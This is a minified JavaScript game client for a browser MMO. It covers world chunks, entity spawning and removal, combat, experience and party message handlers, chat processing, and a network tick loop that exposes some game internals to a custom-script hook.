    const cI = new Map([[6, wP], [2, $P], [7, TP], [4, qP], [0, UP], [9, iI], [5, rI], [8, lI], [3, EP], [1, JP]])
        , hI = (t, e) => 0 == t ? e == Ua.playerId ? NP : tI : cI.get(t)
        , dI = [-0, -1, -0];
    class uI {
        constructor(t) {
            this.entities = {
                array: [],
                map: new Map,
                type: {}
            },
                cI.forEach((t, e) => this.entities.type[e] = []),
                this.chunks = [],
                this.time = 1e-7,
                this.accum = 1e-6,
                this.timestep = 1 / 60,
                this.daytime = 0,
                this.tickId = 0,
                this.spawns = {
                    array: [],
                    map: new Map,
                    types: new Map
                },
                this.grids = {},
                this.settingsCache = new Map,
                this.file = ""
        }
        load(t, e) {
            this.id = t,
                this.file = e
        }
        tickIdToTimestamp(t) {
            return t * this.timestep
        }
        setTime(t) {
            this.tickId = t,
                this.time = this.tickIdToTimestamp(t)
        }
        tick(t) {
            t = Math.min(t, 1),
                this.accum += t;
            let e = 0;
            for (; this.accum > this.timestep;)
                this.accum -= this.timestep,
                    ++e,
                    this.setTime(this.tickId + 1),
                    this.tickFixed(this.timestep);
            1 !== e && Math.abs(this.accum) < .1 * this.timestep && (this.accum = 0),
                this.tickDelta(t, this.accum)
        }
        tickDelta(t, e) {
            const s = this.time + e;
            for (let e = 0, i = this.chunks.length; e < i; ++e)
                this.chunks[e].tickDelta(t, s, this);
            for (let e = this.entities.array.length - 1; e >= 0; --e)
                this.entities.array[e].preDelta(t, s, this),
                    this.entities.array[e].tickDelta(t, s, this),
                    this.entities.array[e].postDelta(t, s, this)
        }
        tickFixed(t) {
            this.daytime = (this.time / 600 + .9) % 1;
            for (let e = 0, s = this.chunks.length; e < s; ++e)
                this.chunks[e].tickFixed(t, this.time);
            for (let e = this.entities.array.length - 1; e >= 0; --e)
                this.entities.array[e].preFixed(t, this.time, this),
                    this.entities.array[e].tickFixed(t, this.time, this),
                    this.entities.array[e].postFixed(t, this.time, this)
        }
        createEntity(t, e, s) {
            return (s = s || {}).spawn = this.spawns.map.get(e),
                s.id = e,
                new (hI(t, e))(s)
        }
        addEntity(t) {
            if (void 0 !== t && void 0 !== t.type)
                if (this.entities.array.length >= 32766)
                    console.log("Error: tried addint entity but we already are at the maximum");
                else {
                    if (!this.isEntityInWorld(t) && !this.isEntityIdTaken(t.id))
                        return this.entities.array.push(t),
                            this.entities.map.set(t.id, t),
                            this.entities.type[t.type].push(t),
                            t;
                    console.log("Error: Entity in world or entity id taken")
                }
            else
                console.log("Error: tried adding an entity of unknown type to the world")
        }
        removeEntity(t) {
            if (void 0 === t)
                return !1;
            this.entities.map.delete(t.id);
            let e = this.entities.array.indexOf(t);
            return e > -1 && this.entities.array.splice(e, 1),
                e = this.entities.type[t.type].indexOf(t),
                e > -1 && this.entities.type[t.type].splice(e, 1),
                t.onRemove(),
                t
        }
        isEntityIdTaken(t) {
            return this.entities.map.has(t)
        }
        isEntityIdAllowed(t) {
            return !0
        }
        isEntityInWorld(t) {
            return this.entities.array.indexOf(t) >= 0
        }
        entity(t) {
            return this.entities.map.get(t)
        }
        getEntityById(t) {
            return this.entities.map.get(t)
        }
        setNetAreaAABB(t, e, s) {
            e -= e % 64,
                s -= s % 64,
                t.l = e - 64,
                t.r = e + 128,
                t.u = s - 64,
                t.d = s + 128
        }
        serialize() {
            return this.serializedData = oo.world.encode(this.data),
                this.serializedData
        }
        getHeight(t, e) {
            t = nr(t, 0, this.bounds),
                e = nr(e, 0, this.bounds);
            const s = this.chunks[Math.min(Math.floor(t / 64), this.chunkAmount - 1) + Math.min(Math.floor(e / 64), this.chunkAmount - 1) * this.chunkAmount];
            return s.deserialized ? s.getHeight(t % 64, e % 64) : -0
        }
        getNormal(t, e) {
            t = nr(t, 0, this.bounds),
                e = nr(e, 0, this.bounds);
            const s = this.chunks[Math.min(Math.floor(t / 64), this.chunkAmount - 1) + Math.min(Math.floor(e / 64), this.chunkAmount - 1) * this.chunkAmount];
            return s.deserialized ? s.getNormal(t % 64, e % 64) : dI
        }
        getSteepness(t, e) {
            t = nr(t, 0, this.bounds),
                e = nr(e, 0, this.bounds);
            const s = this.chunks[Math.min(Math.floor(t / 64), this.chunkAmount - 1) + Math.min(Math.floor(e / 64), this.chunkAmount - 1) * this.chunkAmount];
            return s.deserialized ? s.getSteepness(t % 64, e % 64) : -0
        }
        clampV3(t) {
            return t[0] = nr(t[0], .01, this.bounds - .01),
                t[2] = nr(t[2], .01, this.bounds - .01),
                t
        }
        deserialize({ serialized: t, isUpdate: e }) {
            this.parse({
                deserialized: oo.world.decode(t),
                isUpdate: e
            })
        }
        getChunkFromWorld(t, e) {
            return t = nr(t, 0, this.bounds),
                e = nr(e, 0, this.bounds),
                t = Math.min(Math.floor(t / 64), this.chunkAmount - 1),
                e = Math.min(Math.floor(e / 64), this.chunkAmount - 1),
                this.chunks[t + e * this.chunkAmount]
        }
        getChunk(t, e) {
            return t = nr(t, 0, this.chunkAmount),
                e = nr(e, 0, this.chunkAmount),
                this.chunks[t + e * this.chunkAmount]
        }
        getChunkUnsafe(t, e) {
            if (!(t >= this.chunkAmount || e >= this.chunkAmount))
                return this.chunks[t + e * this.chunkAmount]
        }
        setMode(t) {
            this.mode = Aw[this.id] || Aw[t || "Lx"]
        }
        parse({ deserialized: t, isUpdate: e }) {
            if (e || this.destroy(),
                this.data = t,
                this.deserialized = !0,
                this.settingsCache.clear(),
                this.setMode(this.getSetting("mode")),
                !e) {
                this.chunkAmount = this.data.chunkAmount,
                    this.bounds = 64 * this.chunkAmount,
                    this.grids.props = new vP(this.bounds, 16),
                    this.grids.entities = new vP(this.bounds, 32 * this.chunkAmount),
                    this.chunks = [];
                for (let t = 0; t < this.chunkAmount; ++t)
                    for (let e = 0; e < this.chunkAmount; ++e)
                        this.chunks.push(new gP({
                            id: e + t * this.chunkAmount,
                            x: e,
                            z: t,
                            world: this
                        }));
                for (let t = 0; t < this.chunkAmount; ++t)
                    for (let e = 0; e < this.chunkAmount; ++e) {
                        const s = this.getChunkUnsafe(e, t);
                        s.left = this.getChunkUnsafe(e - 1, t),
                            s.right = this.getChunkUnsafe(e + 1, t),
                            s.front = this.getChunkUnsafe(e, t + 1),
                            s.back = this.getChunkUnsafe(e, t - 1),
                            s.frontRight = this.getChunkUnsafe(e + 1, t + 1),
                            s.backLeft = this.getChunkUnsafe(e - 1, t - 1)
                    }
            }
            this.spawns.array.forEach(t => {
                t.entity > 0 && this.removeEntity(this.getEntityById(t.entity))
            }
            ),
                this.spawns.types.forEach(t => t.clear()),
                this.spawns.array.length = 0,
                this.spawns.map.clear(),
                this.spawns.types.set(2, new Map),
                this.data.spawns.forEach((t, e) => {
                    const s = {
                        entity: 0
                    };
                    Gd(s, t),
                        this.spawns.map.has(s.id) ? console.error(`Duplicate spawn id ${s.id} - spawns must have unique id`) : (this.spawns.map.set(s.id, s),
                            this.spawns.types.has(s.class) || this.spawns.types.set(s.class, new Map),
                            this.spawns.types.get(s.class).set(s.id, s)),
                        this.spawns.array[e] = s
                }
                )
        }
        getSetting(t) {
            if (!this.settingsCache.has(t)) {
                const e = this.data.settings.find(e => e.id === t);
                this.settingsCache.set(t, e ? e.value : void 0)
            }
            return this.settingsCache.get(t)
        }
        destroy() {
            this.deserialized && console.log("destroying world"),
                this.deserialized = !1,
                this.chunks.forEach(t => {
                    t.destroy()
                }
                ),
                this.chunks = [];
            for (let t = this.entities.array.length - 1; t >= 0; t--)
                this.removeEntity(this.entities.array[t]);
            this.grids.entities = void 0,
                this.grids.props = void 0,
                this.spawns.array.length = 0,
                this.spawns.map.clear(),
                this.spawns.types.clear(),
                this.data = void 0
        }
        getPlayerByName(t) {
            const e = t.toLowerCase();
            return this.entities.type[0].find(t => t.name && t.name.toLowerCase() === e)
        }
        getEntitiesInGrid(t, e, s = 100) {
            return this.circle.update(t, e, s).aabb(),
                this.grids.entities.query(this.circle)
        }
    }
    const mI = (t, e, s = "") => {
        Xt.update(i => (i.push({
            text: t,
            icon: e,
            css: s
        }),
            i))
    }
        , pI = {
            2: "On cooldown.",
            3: "Can only be cast on enemy.",
            4: "Can only be cast on ally.",
            5: "Not enough mana.",
            6: "Out of range.",
            10: "Target is dead.",
            7: "Can't do that during movement.",
            8: "Can't cast while busy.",
            9: "You are incapacitated.",
            11: "Can't do that in combat.",
            12: "Can't cast this right now.",
            13: "Level difference is too big."
        }
        , fI = new Map;
    fI.set(15, t => {
        if (HS("system", `You have learned ${Xi.items.book[t[0]].name} Lv. ${t[1] + 1}`, !0),
            ib(24, 100),
            0 === t[1] && by.get(t[0]).autoSkillbar) {
            const e = ji.skillbarsettings[Ua.player.name].findIndex(t => -1 === t.id);
            e >= 0 && Ue[e].update(e => (e.id = t[0],
                e))
        }
    }
    ).set(14, t => {
        Ua.player.skills.add(t[0], jd(t[2]), jd(t[3]), t[1])
    }
    ).set(16, t => {
        Ua.player.skills.remove(t[0])
    }
    ).set(1, t => {
        Vt.set({
            type: "error",
            text: pI[t[0]]
        })
    }
    ).set(17, t => {
        Ua.player.setExp(t[1]);
        const e = Ua.entity(t[2]);
        e && TT(Yi([0, 0, 0], e.visualPosition), t[0]),
            ji.chat[0] && HS("exp", `You gained ${t[0]} experience ${e ? "from " + e.name : ""}.\n      ${Ua.player.exp}/${zp(Ua.player.level)}`, !0)
    }
    ).set(18, t => {
        Ua.player.setExp(t[1]),
            HS("error", `You have lost ${t[0]} experience. ${Ua.player.exp}/${zp(Ua.player.level)}`, !0)
    }
    ).set(19, t => {
        Ua.player.setExp(t[0])
    }
    ).set(42, t => {
        const e = Ua.entity(t[1]);
        dl({
            id: "ui/fame",
            pitch: -1
        }),
            e && PT(Yi([0, 0, 0], e.visualPosition), t[0]),
            ji.chat[11] && HS("fame", `You gained ${t[0]} fame ${e ? "from " + e.name : ""}`, !0)
    }
    ).set(43, t => {
        ji.chat[11] && HS("fame", `You have lost ${t[0]} fame.`, !0)
    }
    ).set(20, t => {
        const e = Ua.getEntityById(t[0]);
        e && e.interact(t)
    }
    ).set(21, t => {
        Gt.set(void 0)
    }
    ).set(22, t => {
        const e = Hr.from(t).toString();
        HS("system", e, !0)
    }
    ).set(23, t => {
        const e = Hr.from(t).toString();
        HS("error", e, !0)
    }
    ).set(45, t => {
        const e = Hr.from(t.slice(1)).toString();
        Pw(Xi.ui.party.summon, Xi.ui.party.onSummon.replace("$1", e), [{
            text: Xi.ui.accept,
            nocombat: !0,
            fun: () => {
                rp("summonaccept", e)
            }
        }, {
            text: Xi.ui.decline,
            fun: () => { }
        }])
    }
    ).set(24, t => {
        const e = Hr.from(t.slice(1)).toString();
        Pw(Xi.ui.party.invite, Xi.ui.party.onInvite.replace("$1", e), [{
            text: Xi.ui.accept,
            fun: () => {
                rp("partyaccept", t[0] + "")
            }
        }, {
            text: Xi.ui.decline,
            fun: () => {
                rp("partydecline", t[0] + "")
            }
        }])
    }
    ).set(25, t => {
        const e = Hr.from(t).toString();
        Pw(Xi.ui.party.link, Xi.ui.party.onLink + `<p><input readonly type="text" id='partylink' value='${e}'></p>`, [{
            text: Xi.ui.party.copyLink,
            fun: () => {
                document.getElementById("partylink").select(),
                    document.execCommand("copy")
            }
        }, {
            text: Xi.ui.close
        }])
    }
    ).set(26, t => {
        Ua.player.inventory.setItem(t[0], t[1], t[2])
    }
    ).set(27, t => {
        Ua.player.inventory.removeItem(t[0], t[1])
    }
    ).set(28, t => {
        Ua.player.inventory.setGold(t[0], t[1], t[2])
    }
    ).set(29, t => {
        Ua.player.inventory.setMedals(t[0], t[1], t[2])
    }
    ).set(30, t => {
        ue.set(t[0]),
            zE(t[0], t[1], 12, "$sp")
    }
    ).set(31, t => {
        ye.set(0 == t[0] ? void 0 : t[0] - 1)
    }
    ).set(44, t => {
        be.set(0 == t[0] ? void 0 : t[0] - 1)
    }
    ).set(32, t => {
        Se.set(t[0])
    }
    ).set(33, t => {
        gI(t, Ee)
    }
    ).set(34, t => {
        _e.update(t => !t),
            HS("inv", Xi.ui.merchant.auctioncancel, !0)
    }
    ).set(35, t => {
        gI(t.slice(1), Pe),
            Te.set({
                gold: t[0]
            })
    }
    ).set(36, t => {
        Te.set({
            gold: t[0]
        })
    }
    ).set(37, t => {
        Te.set(!1)
    }
    ).set(38, t => {
        Ie.set(!0),
            ib(22, 100)
    }
    ).set(39, t => {
        Ie.set(!1)
    }
    ).set(40, t => {
        De.set(!0)
    }
    ).set(41, t => {
        De.set(!1)
    }
    ).set(47, t => {
        const e = Ua.entity(t[0]);
        void 0 !== e && (e.party = 1)
    }
    ).set(46, t => {
        const e = t[0];
        e < 1e3 && e > 0 && Vt.set({
            type: "error",
            timer: 500,
            text: e
        }),
            e <= 5 && e > 0 ? dl({
                id: "ui/countdown",
                pitch: -1
            }) : 0 === e ? dl({
                id: "ui/battlestart",
                pitch: -1
            }) : 1e3 === e ? dl({
                id: "ui/victory",
                pitch: -1
            }) : 2e3 === e && dl({
                id: "ui/loss",
                pitch: -1
            })
    }
    ).set(48, t => {
        fm(t[0])
    }
    );
    const gI = (t, e) => {
        e.update(e => (e.length = 0,
            t.forEach(t => {
                e.push(new FE(t))
            }
            ),
            e))
    }
        , vI = (t, e) => {
            Ua.player && fI.get(t)(e)
        }
        , yI = new Map;
    yI.set(0, (t, e, s) => {
        Ua.removeEntity(t)
    }
    ).set(24, (t, e, s) => {
        const i = Od(2 * e[1], 768);
        t && (t === Ua.player || My([i[0], 1, i[1]], Ua.netArea) ? t.forceNetPosition(i) : Ua.removeEntity(t))
    }
    ).set(1, (t, e, s) => {
        e[1] > 0 && e[1] !== t.target && t.transform && t.transform.onAggro(),
            t === Ua.player ? pw(e[1]) : t.setTarget(e[1]) && tr.has("creatureChangeTarget") && tr.get("creatureChangeTarget").forEach(s => s(t.id, e[1]))
    }
    ).set(2, (t, e, s) => {
        for (let s = 1; s < e.length; s += 2)
            t.stats.setResource(e[s], e[s + 1])
    }
    ).set(5, (t, e, s) => {
        for (let s = 1; s < e.length; s += 2)
            t.stats.setResource(e[s], e[s + 1])
    }
    ).set(3, (t, e, s) => {
        for (let s = 1; s < e.length; s += 2)
            t.stats.setStat(e[s], e[s + 1])
    }
    ).set(4, (t, e, s) => {
        if (t == Ua.player && (ib(6, 100),
            t.skills.cd(e[1], Ua.time, jd(e[2])),
            e[5] > 0 && t.skills.globalCd(jd(e[4]), jd(e[5]))),
            !s && t.transform && !t.transform.inFog) {
            const s = by.get(e[1]);
            s.castLen && t.transform.currentAnim || !s.fx.animCast || t.transform.anim(s.fx.animCast),
                s.fx.weaponRibbon && t.transform.weapon && wh({
                    parent: t.transform.weapon,
                    ...s.fx.weaponRibbon
                }),
                s.fx.effectCast && s.fx.effectCast.forEach(e => {
                    td(e, void 0, t.transform).data.creature = t
                }
                ),
                t.transform.onEffort()
        }
        tr.has("creatureCast") && tr.get("creatureCast").forEach(s => s(t.id, e[1]))
    }
    ).set(20, (t, e, s) => {
        t.skills.startTimedCast(by.get(e[1]), jd(e[2]), e[3], jd(e[4])),
            e[5] > 0 && t.skills.globalCd(jd(e[2]), jd(e[5]))
    }
    ).set(21, (t, e, s) => {
        t.skills.interruptTimedCast(!0)
    }
    ).set(22, (t, e, s) => {
        t.skills.finishTimedCast(jd(e[1]))
    }
    ).set(6, (t, e, s) => {
        const i = Ua.getEntityById(e[3])
            , n = e[4];
        void 0 !== i && "Damage" === ji.dpsmeterMode && p$(i, e[1]),
            t === Ua.player ? ji.showIncomingDamage && MT([-.2, -.2, .5], e[1], n, e[5], !0) : i === Ua.player && MT(Yi([0, 0, 0], t.visualPosition), e[1], n, e[5]),
            n > 0 && t.stats.changeResource(6, -e[1]),
            e[6] > 0 && (t.stats.refreshCombatTimer(Ua.time, e[6]),
                i && i.stats.refreshCombatTimer(Ua.time, e[6]));
        const a = by.get(e[2]);
        if (!s && n > 0)
            if (1 !== n)
                i && i.transform && t.transform && !t.transform.inFog && (a.fx.impactSound && dl({
                    ...nv(a.fx.impactSound, i),
                    transform: t.transform,
                    pitch: a.fx.impactSoundPitchCaster ? i.transform.getScaleFactor() : 1
                }),
                    a.fx.effectDirImpact && a.fx.effectDirImpact.forEach(e => {
                        const s = td(e);
                        s.data.creature = t,
                            tn(s.data.dir = [0, 0, 0], i.transform.position, t.transform.position),
                            on(s.data.dir, s.data.dir),
                            sn(s.position, t.transform.position, s.data.dir, t.shape.radius),
                            s.updateMatrix(),
                            s.updateMatrixWorld(!0)
                    }
                    ),
                    a.fx.effectTarget && a.fx.effectTarget.forEach(e => {
                        td(e, void 0, t.transform).data.creature = t
                    }
                    ),
                    t.transform.onHurt(e[1] / t.stats.getStat(6), n));
            else if (i && i.transform && t.transform && !t.transform.inFog && !i.transform.inFog) {
                const e = td(_f.physBlock);
                e.data.creature = t,
                    tn(e.data.dir = [0, 0, 0], i.transform.position, t.transform.position),
                    on(e.data.dir, e.data.dir),
                    sn(e.position, t.transform.position, e.data.dir, t.shape.radius),
                    e.updateMatrix(),
                    e.updateMatrixWorld(!0)
            }
        tr.has("creatureDamage") && tr.get("creatureDamage").forEach(s => s(t.id, e[3], e[2], e[1], e[4]))
    }
    ).set(7, (t, e, s) => {
        const i = Ua.getEntityById(e[3]);
        void 0 !== i && "Healing" === ji.dpsmeterMode && p$(i, e[1]),
            i && e[5] && i.stats.refreshCombatTimer(Ua.time, e[5]),
            t === Ua.player ? ji.showIncomingHeal && _T([.2, -.2, .5], e[1], e[4], !0) : i === Ua.player && _T(Yi([0, 0, 0], t.visualPosition), e[1], e[4]),
            t.stats.changeResource(6, e[1]);
        const n = by.get(e[2]);
        !s && i && i.transform && t.transform && !t.transform.inFog && xI(n, i, t),
            tr.has("creatureHeal") && tr.get("creatureHeal").forEach(s => s(t.id, e[3], e[2], e[1], e[4]))
    }
    ).set(8, (t, e, s) => {
        t.stats.changeResource(7, e[1]);
        const i = Ua.getEntityById(e[3]);
        if (t === Ua.player && ji.showIncomingHeal && CT([.25, -.2, .5], e[1], e[4], !0),
            t.transform && !t.transform.inFog) {
            td(_f.gainMana, void 0, t.transform).data.creature = t
        }
        const n = by.get(e[2]);
        !s && i && i.transform && t.transform && !t.transform.inFog && !i.transform.inFog && xI(n, i, t),
            tr.has("creatureManaGain") && tr.get("creatureManaGain").forEach(s => s(t.id, e[3], e[2], e[1]))
    }
    ).set(9, (t, e, s) => {
        0 == e[1] ? t.stats.alive && (t.stats.die(),
            t == Ua.player && Ua.mode.allowRespawn ? Pw(Xi.ui.death.death, Xi.ui.death.deathmsg, [{
                text: Xi.ui.death.respawn,
                fun: () => {
                    rp("respawn", "")
                }
            }]) : t.id == Ua.player.target && ib(7, 100)) : t.stats.alive || t.stats.respawn()
    }
    ).set(10, (t, e, s) => {
        t.setFaction(e[1])
    }
    ).set(13, (t, e, s) => {
        t.setLevel(e[1])
    }
    ).set(15, (t, e, s) => {
        t.setClass(e[1])
    }
    ).set(11, (t, e, s) => {
        t.setName(Hr.from(e.slice(1)).toString())
    }
    ).set(12, (t, e, s) => {
        t.setClan(e.length > 2 ? Hr.from(e.slice(2)).toString() : void 0, e[1])
    }
    ).set(14, (t, e, s) => {
        if (t.setLevel(e[1]),
            ji.chat[6]) {
            const s = `${t == Ua.player ? "You" : wI(e[0])} leveled up to ${e[1]}!`;
            HS("lvlup", s),
                t == Ua.player && (ib(16, 100),
                    by.forEach(t => {
                        t.class === Ua.player.class && t.minlevel === e[1] && (ib(19, 100),
                            mI(`<span class=textprimary><b class=textgreen>${Xi.items.book[t.id].name}</b><br>Skill book available at the Trader!</span>`, `skills/${t.id}.${Ro}`, "border primary"))
                    }
                    ))
        }
        t.transform && !t.transform.inFog && td(_f.levelUp, void 0, t.transform)
    }
    ).set(16, (t, e, s) => {
        t.buffs.setBuff(e[1], e[2], e[3], jd(e[4]), jd(e[5]), e[6], e[7], e.length > 8 ? e.slice(8) : void 0)
    }
    ).set(17, (t, e, s) => {
        t.buffs.removeBuff(e[1], e[2])
    }
    ).set(18, (t, e, s) => {
        const i = by.get(e[1])
            , n = new fh(Ua.time, jd(e[3]) - Ua.time + .2);
        au(e[0], e[2], i, n)
    }
    ).set(19, (t, e, s) => {
        const i = by.get(e[1])
            , n = new fh(Ua.time, jd(e[8]) - Ua.time);
        ru([Zd(e[2], 768), Zd(e[3], 768), Zd(e[4], 768)], pn([0, 0, 0], [0, e[5] * e[6]], zd(e[7], hr)), i, n)
    }
    ).set(23, (t, e, s) => {
        t.setParty(e[1], e[2])
    }
    ).set(25, (t, e, s) => {
        !1 === t.hasInfo && t.setDropInfo(e[1], e[2], e[3], e[4], e[5])
    }
    ).set(26, (t, e, s) => {
        t.setPosLock(e[1], e[2], e[3])
    }
    );
    const bI = (t, e, s) => {
        const i = Ua.getEntityById(e[0]);
        void 0 === i || yI.get(t)(i, e, s)
    }
        , wI = t => {
            const e = Ua.getEntityById(t);
            return "" + (t > 0 ? e ? e.name : "unknown" : "nobody")
        }
        , xI = (t, e, s) => {
            t.fx.effectDirImpact && t.fx.effectDirImpact.forEach(t => {
                const i = td(t);
                i.data.creature = s,
                    e && (tn(i.data.dir = [0, 0, 0], e.transform.position, s.transform.position),
                        on(i.data.dir, i.data.dir),
                        sn(i.position, s.transform.position, i.data.dir, s.shape.radius),
                        i.updateMatrix(),
                        i.updateMatrixWorld(!0))
            }
            ),
                t.fx.effectTarget && t.fx.effectTarget.forEach(t => {
                    td(t, void 0, s.transform).data.creature = s
                }
                )
        }
        , kI = [Gt, Se, Te, De, Ie]
        , $I = [Kt, Ee, Yt]
        , SI = [ne, ae]
        , EI = () => {
            SI.forEach(t => t.update(t => (t.visible = !1,
                t))),
                Ht.update(t => (t.membercount = 0,
                    t.role = 0,
                    ji.partyinfo = t,
                    t)),
                kI.forEach(t => t.set()),
                $I.forEach(t => t.set([]))
        }
        ;
    class MI extends uI {
        constructor(t) {
            super(t),
                window.game = this,
                window.pak = ro,
                window.send = Bm,
                loadCustomScript(),
                window.game_input = Ul,
                window.game_pickup_action = dl,
                this.smoothtime = 0,
                this.unsetLoading = !1,
                this.removePlayer(),
                this.netTimeoutTimer = new fh,
                this.netArea = {
                    l: 0,
                    r: 0,
                    d: 0,
                    u: 0
                },
                this.party = new Map,
                this.partyIterator = 0,
                this.uiTimer = new fh(0, 1 / 30),
                Am("close", () => {
                    console.log("on disconnect"),
                        this.onDisconnect()
                }
                ),
                this.netData = [],
                Am(ro.serverEntityDelta.header, t => {
                    this.netData.push(ro.serverEntityDelta.decode(t))
                }
                ),
                this.personalLog = [],
                Am(ro.serverPersonalLog.header, t => {
                    (t = ro.serverPersonalLog.decode(t)).log.forEach(t => this.personalLog.push(t))
                }
                ),
                this.chatData = [],
                Am(ro.serverChat.header, async t => {
                    this.chatData.push(t)
                }
                ),
                this.systemMessageData = [],
                Am(ro.serverSystemMessage.header, async t => {
                    this.systemMessageData.push(t)
                }
                ),
                this.partyData = void 0,
                Am(ro.serverPartyUpdate.header, async t => {
                    this.partyData = t
                }
                ),
                Am(ro.serverPartyPositions.header, async t => {
                    t = ro.serverPartyPositions.decode(t).members,
                        this.party.forEach(e => {
                            const s = t.find(t => t.entityid === e.id);
                            s && (e.Za = Od(s.Za, 768))
                        }
                        )
                }
                )
        }
        handlePartyData(t) {
            let e;
            this.party.forEach(t => {
                t.found = !1
            }
            ),
                (t = ro.serverPartyUpdate.decode(t)).members.forEach(t => {
                    if (this.party.has(t.name)) {
                        const e = this.party.get(t.name);
                        t.entityid !== this.player.id && e.unitStore.update(e => (e.id = t.entityid,
                            e.name = t.name,
                            e.level = t.level,
                            e.class = t.class,
                            e.world = t.world,
                            e.party = this.player.party,
                            e.faction = this.player.faction,
                            e.role = t.role,
                            e)),
                            e.found = !0
                    } else
                        this.party.set(t.name, {
                            id: t.entityid,
                            found: !0,
                            name: t.name,
                            buffStore: t.entityid == this.player.id ? oe : qt([]),
                            unitStore: t.entityid == this.player.id ? ne : qt({
                                id: t.entityid,
                                name: t.name,
                                level: t.level,
                                class: t.class,
                                world: t.world,
                                role: t.role,
                                party: this.player.party,
                                faction: this.player.faction,
                                type: 0,
                                visible: !0,
                                alive: !0,
                                powertype: !1,
                                range: !1
                            })
                        });
                    t.entityid == this.player.id && (e = t)
                }
                ),
                this.party.forEach((t, e) => {
                    t.found || this.party.delete(e)
                }
                ),
                Kt.set(Array.from(this.party.values()).filter(t => ji.showSelfInParty || t.id != this.player.id)),
                e ? Ht.update(s => (s.membercount = t.members.length,
                    s.role = e.role,
                    s.queues = t.queues,
                    ji.partyinfo = s,
                    s)) : Ht.update(t => (t.membercount = 0,
                        t.role = 0,
                        t.queues = [],
                        ji.partyinfo = t,
                        t))
        }
        handleChatData(t) {
            t.forEach(t => {
                (t = ro.serverChat.decode(t)).messages.forEach(t => {
                    if ("" == t.from) {
                        const e = t.message.split(" ");
                        Xi && Xi.ui.messages[e[0]] && (t.message = Xi.ui.messages[e[0]],
                            e.splice(1).forEach((e, s) => {
                                t.message = t.message.replace("$" + (s + 1), e)
                            }
                            )),
                            t.channel = "notice"
                    } else if (ji.chatbubbles) {
                        const e = this.getPlayerByName(t.from);
                        if (e) {
                            let s;
                            switch (t.channel) {
                                case "clan":
                                    s = bT.chatClan;
                                    break;
                                case "party":
                                    s = bT.chatParty;
                                    break;
                                default:
                                case "global":
                                    s = bT.chatGlobal
                            }
                            e.speech(t.from + ": " + t.message, s)
                        }
                    }
                    "whisper" == t.channel && (t.from = t.to == this.player.name ? "from " + t.from : "to " + t.to),
                        "GM" === t.clan && "global" === t.channel && (t.channel = "GM"),
                        HS(t.channel, t.message, ["system", "notice"].includes(t.channel), t.from, t.faction, t.class, t.level, t.subscribed)
                }
                )
            }
            )
        }
        handleSystemMessageData(t) {
            t.forEach(t => {
                (t = ro.serverSystemMessage.decode(t)).messages.forEach(t => {
                    HS(t.type, t.message, !0)
                }
                )
            }
            )
        }
        handleEntityDelta(t) {
            if (this.netData.length > 0) {
                const e = this.netData.shift();
                this.setTime(e.tickId);
                const s = e.data[0]
                    , i = e.ids[0];
                for (let t = 0; t < s.length; ++t) {
                    if (this.getEntityById(i[t]))
                        continue;
                    const e = s[t];
                    for (let s = 0; s < e.length; s += 2)
                        e[s] == Jg.entityType && this.addEntity(this.createEntity(e[s + 1], i[t], {
                            world: this
                        }))
                }
                for (let t = 0; t < e.data.length; ++t) {
                    const s = e.data[t]
                        , i = e.ids[t];
                    for (let t = 0; t < s.length; ++t) {
                        const e = this.getEntityById(i[t])
                            , n = s[t];
                        for (let t = 0; t < n.length; t += 2)
                            e && e.parseDelta(n[t], n[t + 1], this)
                    }
                }
                const n = t - this.time > 3;
                for (let t = 0, s = e.log.length; t < s; ++t)
                    bI(e.log[t].type, e.log[t].data, n)
            }
            if (this.personalLog.length > 0) {
                for (let t = 0, e = this.personalLog.length; t < e; ++t)
                    vI(this.personalLog[t].type, this.personalLog[t].data);
                this.personalLog.length = 0
            }
        }
        tick(t) {
            if (this.netData.length > 0) {
                let t = ~~Math.max(1, this.netData.length / 2);
                const e = this.tickIdToTimestamp(this.netData[this.netData.length - 1].tickId);
                for (; this.deserialized && t--;)
                    this.handleEntityDelta(e)
            }
            if (this.player) {
                if (super.tick(t),
                    this.setSmoothTime(t),
                    this.player && this.netTimeoutTimer.done(this.time) || this.time < this.netTimeoutTimer.start) {
                    this.netTimeoutTimer.reset(this.time - .5, 2),
                        this.setNetAreaAABB(this.netArea, this.player.Za[0], this.player.Za[2]);
                    for (let t = this.entities.array.length - 1; t >= 0; t--) {
                        const e = this.entities.array[t];
                        e != this.player && (My(e.Za, this.netArea) ? e.netDeletion.reset(0, 0) : 0 === e.netDeletion.end && e.netDeletion.reset(this.time, 2 + 2 * Math.random()))
                    }
                }
                for (let t = this.entities.array.length - 1; t >= 0; t--) {
                    const e = this.entities.array[t];
                    e != this.player && (e.netDeletion.end > 0 && e.netDeletion.done(this.time) && (this.removeEntity(e),
                        e.id == this.player.target && this.player.setTarget(0)))
                }
                if (this.player && (this.partyData && (this.handlePartyData(this.partyData),
                    this.partyData = void 0),
                    this.chatData.length && (this.handleChatData(this.chatData),
                        this.chatData.length = 0),
                    this.systemMessageData.length && (this.handleSystemMessageData(this.systemMessageData),
                        this.systemMessageData.length = 0),
                    this.player.party > 0))
                    if (ji.partyBuffLimitUpdateRate) {
                        const t = Array.from(this.party.values())[this.partyIterator++ % this.party.size];
                        if (t) {
                            const e = this.entity(t.id);
                            void 0 !== e && e.id !== this.player.id && (e.buffDisplayDirty = !0)
                        }
                    } else
                        this.entities.type[0].forEach(t => {
                            t.party === this.player.party && (t.buffDisplayDirty = !0)
                        }
                        )
            }
        }
        removeEntity(t) {
            const e = super.removeEntity(t);
            if (e) {
                const t = this.party.get(e.name);
                void 0 !== t && (t.unitStore.update(t => (t.timedSkill = void 0,
                    t.timedCast = void 0,
                    t.alive = !0,
                    t.range = !1,
                    t.mp = t.hp = t.hpMax = t.mpMax = 0,
                    t)),
                    t.buffStore.set([]))
            }
            return e
        }
        load(t, e, s) {
            super.load(t, e),
                this.deserialized = !1,
                this.playerId = s,
                ee.set(!0),
                this.unsetLoading = !0,
                fetch("/worlddata/" + this.file + "/world?v=4002247", {
                    cache: "default"
                }).then(t => {
                    t.ok && t.arrayBuffer().then(t => {
                        this.deserialize({
                            serialized: Hr(t)
                        })
                    }
                    )
                }
                )
        }
        parse({ deserialized: t, isUpdate: e, sendToServer: s }) {
            t && super.parse({
                deserialized: t,
                isUpdate: e
            }),
                am({
                    world: this,
                    first: !e
                }),
                s && (this.serialize(),
                    this.sendToServer())
        }
        onDisconnect() {
            this.netData.length = 0,
                this.personalLog.length = 0,
                this.partyData = void 0,
                this.party.clear()
        }
        destroy() {
            super.destroy(),
                rm({
                    world: this
                }),
                this.uiTimer.reset(0),
                JT(this)
        }
